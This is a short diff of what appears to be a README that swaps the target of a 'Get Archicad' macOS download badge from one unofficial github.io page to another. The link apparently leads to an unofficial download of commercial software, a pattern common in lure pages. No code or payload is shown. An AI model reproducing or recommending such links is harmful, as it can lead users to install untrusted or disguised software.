@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://macos-25.github.io/.github/archicad">  
+<a href="https://osx-app.github.io/.github/archicad">  
 <img src="https://img.shields.io/badge/⬇️_Get_Archicad-blue?style=for-the-badge&logo=apple" alt="Get Archicad">  
 </a>  
 </div>  
